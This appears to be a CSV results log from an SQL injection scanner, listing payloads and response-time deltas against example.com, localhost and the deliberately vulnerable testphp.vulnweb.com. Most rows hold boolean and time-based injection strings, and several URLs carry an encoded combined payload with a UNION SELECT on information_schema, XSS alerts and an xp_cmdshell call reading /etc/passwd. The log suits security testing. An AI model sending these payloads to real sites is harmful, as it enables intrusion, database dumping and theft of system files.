timestamp,url,parameter,injection_type,payload,baseline_time,injected_time,delta,content_length,status_code
2025-12-16T12:34:29.030407,http://example.com/page?id=0,id,boolean, AND 1=0,0.3,0.4,0.10000000000000003,5000,200
2025-12-16T12:34:29.046902,http://example.com/page?id=1,id,boolean, AND 1=1,0.31,0.41000000000000003,0.10000000000000003,5100,200
2025-12-16T12:34:29.057019,http://example.com/page?id=2,id,boolean, AND 1=0,0.32,0.42000000000000004,0.10000000000000003,5200,200
2025-12-16T12:34:29.066536,http://example.com/page?id=3,id,boolean, AND 1=1,0.32999999999999996,0.43000000000000005,0.10000000000000009,5300,200
2025-12-16T12:34:29.077403,http://example.com/page?id=4,id,boolean, AND 1=0,0.33999999999999997,0.44,0.10000000000000003,5400,200
2025-12-16T12:34:29.086807,http://example.com/page?id=5,id,boolean, AND 1=1,0.35,0.45,0.10000000000000003,5500,200
2025-12-16T12:34:29.098319,http://example.com/page?id=6,id,boolean, AND 1=0,0.36,0.46,0.10000000000000003,5600,200
2025-12-16T12:34:29.109362,http://example.com/page?id=7,id,boolean, AND 1=1,0.37,0.47000000000000003,0.10000000000000003,5700,200
2025-12-16T12:34:29.118814,http://example.com/page?id=8,id,boolean, AND 1=0,0.38,0.48000000000000004,0.10000000000000003,5800,200
2025-12-16T12:34:29.129582,http://example.com/page?id=9,id,boolean, AND 1=1,0.39,0.49,0.09999999999999998,5900,200
2026-01-02T07:13:45.515885,http://127.0.0.1:8000/search?name=test,name,time-based, AND WAITFOR DELAY '00:00:5',0.001074075698852539,5.002222299575806,5.001148223876953,261,400
2026-01-02T07:53:35.629639,http://127.0.0.1:8000/search?name=test,name,time-based, AND WAITFOR DELAY '00:00:5',0.0009832382202148438,5.0020670890808105,5.001083850860596,261,400
2026-01-02T07:55:32.074819,http://127.0.0.1:8000/search?name=test,name,time-based, AND WAITFOR DELAY '00:00:5',0.0010557174682617188,5.002045392990112,5.000989675521851,261,400
2026-01-02T08:00:29.026484,http://127.0.0.1:8000/search?name=test,name,time-based, AND WAITFOR DELAY '00:00:5',0.0009801387786865234,5.001994609832764,5.001014471054077,261,400
2026-01-02T08:01:36.110476,http://127.0.0.1:8000/search?name=test,name,time-based, AND WAITFOR DELAY '00:00:5',0.0012683868408203125,5.002267360687256,5.0009989738464355,261,400
2026-01-02T08:02:02.978222,http://127.0.0.1:8000/search?name=test,name,time-based, AND WAITFOR DELAY '00:00:5',0.0011696815490722656,5.002096891403198,5.000927209854126,261,400
2026-01-02T08:03:51.568706,http://127.0.0.1:8000/search?name=test,name,time-based, AND WAITFOR DELAY '00:00:5',0.0018148422241210938,5.003324747085571,5.00150990486145,261,400
2026-01-02T08:39:13.548192,http://127.0.0.1:8000/search?name=test,name,time-based, AND WAITFOR DELAY '00:00:5',0.4754829406738281,5.488853216171265,5.0133702754974365,10.543743732199447,261,400,,,search
2026-01-02T10:41:21.857241,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&HlhS=7264%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1,1.1274926662445068,0.7348544597625732,-0.3926382064819336,-0.34824014225276256,1343,200,,,generic
2026-01-02T10:41:21.921467,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&uiDo=4470%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1,1.0435128211975098,0.7450189590454102,-0.2984938621520996,-0.2860471439244564,1343,200,,,generic
2026-01-02T10:41:21.944896,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&DUMM=1329%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1,1.068444013595581,0.6321845054626465,-0.43625950813293457,-0.4083129322469713,1343,200,,,generic
2026-01-02T10:41:24.267133,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&DUMM=1329%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1--,1.068444013595581,0.730750322341919,-0.3376936912536621,-0.31606119455640774,1343,200,,,generic
2026-01-02T10:41:24.284111,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&HlhS=7264%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1--,1.1274926662445068,0.41402435302734375,-0.7134683132171631,-0.6327919769035918,1343,200,,,generic
2026-01-02T10:41:24.313414,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&uiDo=4470%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1--,1.0435128211975098,0.5797665119171143,-0.4637463092803955,-0.4444088274336789,1343,200,,,generic
2026-01-02T10:41:29.376310,http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php?id=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E&mjqN=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,id,boolean,""" OR 1=1--",1.0198843479156494,0.5578887462615967,-0.46199560165405273,-0.45298822616332823,319,200,,,generic
2026-01-02T10:41:49.775301,http://testphp.vulnweb.com/index.php?id=%252%25&user=1&gqAL=9173%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,time-based,' WAITFOR DELAY '00:00:5'/*,1.2921795845031738,4.358789443969727,3.0666098594665527,2.373207173556781,4958,200,,,generic
2026-01-02T10:41:52.571077,http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php?id=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E&mjqN=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,id,time-based,' WAITFOR DELAY '00:00:5'--,1.1532621383666992,7.114506244659424,5.961244106292725,5.16902784542576,210,200,,,generic
2026-01-02T10:41:58.665251,http://testphp.vulnweb.com/index.php?id=%252%25&user=1&gqAL=9173%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,time-based,""" WAITFOR DELAY '00:00:5'/*",1.2921795845031738,4.443744897842407,3.1515653133392334,2.4389530303181264,4958,200,,,generic
